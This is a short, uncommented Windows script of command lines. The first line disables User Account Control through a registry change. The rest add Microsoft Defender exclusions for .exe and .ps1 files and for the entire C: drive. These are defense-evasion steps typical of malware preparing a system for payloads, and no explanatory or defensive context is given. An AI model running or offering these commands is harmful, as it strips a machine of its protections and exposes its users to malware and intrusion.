%windir%\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
Add-MpPreference -ExclusionExtension "exe"
Add-MpPreference -ExclusionExtension ".exe"
Add-MpPreference -ExclusionExtension "ps1"
Add-MpPreference -ExclusionExtension ".ps1"
Add-MpPreference -ExclusionPath "C:"
Add-MpPreference -ExclusionPath "C:\"
